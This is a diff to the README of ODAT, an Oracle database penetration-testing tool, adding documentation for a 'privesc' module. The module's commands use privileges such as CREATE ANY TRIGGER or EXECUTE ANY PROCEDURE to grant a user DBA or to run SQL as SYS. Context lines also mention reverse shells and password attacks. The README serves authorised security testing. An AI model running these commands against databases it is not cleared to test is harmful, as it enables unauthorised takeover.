@@ -7,14 +7,22 @@ __ODAT__ (Oracle Database Attacking Tool) is an open source __penetration testin
 
 Usage examples of ODAT:
 * You have an Oracle database listening remotely and want to find valid __SIDs__ and __credentials__ in order to connect to the database
-* You have a valid Oracle account on a database and want to __escalate your privileges__ (ex: SYSDBA)
-* You have a valid Oracle account and want to __execute commands on the operating system__ hosting this DB (ex: reverse shell)
-
+* You have a valid Oracle account on a database and want to __escalate your privileges__ to become DBA or SYSDBA
+* You have a Oracle account and you want to __execute system commands__ (e.g. __reverse shell__) in order to move forward on the operating system hosting the database
 
 Tested on Oracle Database __10g__,  __11g__ and __12c__(12.1.0.2.0).
 
 Changelog
 ====
+* Version __2.0__ (__2016/02/21__) :
+ * A new module (_privesc_) for using system privileges of an Oracle user (e.g. CREATE ANY PROCEDURE) in order to gain privileged access (i.e. DBA). System privileges that can be used by ODAT in this version:
+   * CREATE ANY PROCEDURE: execution of arbitrary requests with APEX_040200's privileges (e.g. modification of Oracle users' passwords)
+   * CREATE PROCEDURE and EXECUTE ANY PROCEDURE: execution of arbitrary requests as SYS (e.g. gives DBA role to a user)
+   * CREATE ANY TRIGER (and CREATE PROCEDURE): execution of arbitrary requests as SYS (e.g. gives DBA role to a user)
+   * ANALYZE ANY (and CREATE PROCEDURE): execution of arbitrary requests as SYS (e.g. gives DBA role to a user)
+   * CREATE ANY INDEX (and CREATE PROCEDURE): execution of arbitrary requests as SYS (e.g. gives DBA role to a user)
+ * The module _privesc_ can be used to get all system privileges and roles granted. It shows system privileges that can be used to gain privileged access.
+ * new option (-vvv) for showing SQL requests sent by ODAT in debugs
 * Version __1.6__ (__2015/07/14__) :
  * new feature to detect if a target is vulnerable to TNS poisoning (CVE-2012-1675)
  * new module named *unwrapper* to unwrap PL/SQL source code wrapped, from a file or a remote database
@@ -60,13 +68,19 @@ Thanks to ODAT, you can:
  * UTL_FILE
  * external tables
  * CTXSYS
- * DBMS_LOB (NEW : 2014/07/28)
+ * DBMS_LOB
 * __upload files__ on the database server using:
  * UTL_FILE
  * DBMS_XSLPROCESSOR
  * DBMS_ADVISOR
 * __delete files__ using:
  * UTL_FILE
+* __gain privileged access__ using these following system privileges combinations (see help for *privesc* module commands): (__NEW__ : 2016/02/21)
+ * CREATE ANY PROCEDURE
+ * CREATE PROCEDURE and EXECUTE ANY PROCEDURE
+ * CREATE ANY TRIGER (and CREATE PROCEDURE)
+ * ANALYZE ANY (and CREATE PROCEDURE)
+ * CREATE ANY INDEX (and CREATE PROCEDURE)
 * __send/reveive HTTP requests__ from the database server using:
  * UTL_HTTP
  * HttpUriType
@@ -80,10 +94,12 @@ Thanks to ODAT, you can:
  * pickup the session key and salt for arbitrary users
  * attack by dictionary on sessions
 * check __CVE-2012-1675__ (http://seclists.org/fulldisclosure/2012/Apr/204)
-* __search in column names__ thanks to the *search* module: (NEW : 2015/03/17)
+* __search in column names__ thanks to the *search* module:
  * search a pattern (ex: password) in column names
 * __unwrap__ PL/SQL source code (10g/11g and 12c)
-![Alt text](./pictures/ODAT_main_features_v1.1.jpg)
+* get __system privileges__ and __roles granted__. It is possible to get privileges and roles of roles granted also (__NEW__ : 2016/02/21)
+
+![Alt text](./pictures/ODAT_main_features_v2.0.jpg)
 
 Supported Platforms and dependencies
 ====
@@ -610,6 +626,52 @@ dpvm2y/8e4GQNNJr8ynRmaVUXCcwg5BK7Z7WZy9GXsE+YUtphQwUvwrjGSgSmOM9b/RUVKIU
 ```sql
 SELECT text FROM all_source WHERE name='WRAPPED_OBJECT' ORDER BY line
 ```
+
+ *privesc* module
+---
+
+* This module allows you to gain privileged access (e.g. DBA) using system privileges given to Oracle user used to run this module.
+
+* With these following conbinaisons of system privileges, the Oracle user can become DBA using SYS's privileges:
+ * __CREATE PROCEDURE__ and EXECUTE ANY PROCEDURE
+ * __CREATE ANY TRIGER__ (and CREATE PROCEDURE)
+ * __ANALYZE ANY__ (and CREATE PROCEDURE)
+ * __CREATE ANY INDEX__ (and CREATE PROCEDURE)
+
+
+* With the __CREATE ANY PROCEDURE__ privilege, it is possible to alter all Oracle users' passwords (e.g. SYS's password) using APEX_040200's privileges.
+
+* With this *privesc* module, you can give the DBA role to Oracle user used in this module (e.g. *$USER*). Here is an example using CREATE/EXECUTE ANY PROCEDURE privileges:
+```bash
+./odat.py privesc -s $SERVER -d $ID -U $USER -P $PASSWORD --dba-with-create-any-trigger
+```
+
+* Also, it is possible to execute SQL requests as SYS manually. Here is an example using CREATE/EXECUTE ANY PROCEDURE privileges:
+```bash
+./odat.py privesc -s $SERVER -d $ID -U $USER -P $PASSWORD --exec-with-execute-any-procedure 'GRANT dba TO $USER'
+```
+
+* You can revoke the DBA role using the following command:
+```bash
+./odat.py privesc -s $SERVER -d $ID -U $USER -P $PASSWORD --revoke-dba-role
+```
+
+* As a reminder, you can use the following command to see commands of this module:
+```bash
+./odat.py privesc -s $SERVER -d $ID -U $USER -P $PASSWORD -h
+```
+
+* The command *--get-detailed-privs* can be used to get system privileges and roles granted to Oracle user used to run this module. Also, it gets system privileges and roles given to roles granted to Oracle user.
+```bash
+./odat.py privesc -s $SERVER -d $ID -U $USER -P $PASSWORD --get-detailed-privs
+```
+
+* To see privileges and roles given to the current Oracle user only, the command *--get-privs* must be used:
+```bash
+./odat.py privesc -s $SERVER -d $ID -U $USER -P $PASSWORD --get-privs
+```
+
+* Notice these 2 previous commands underlines system privileges that can be exploited by this module to gain privileged access.
 
 ---
 | __Quentin HARDY__    |
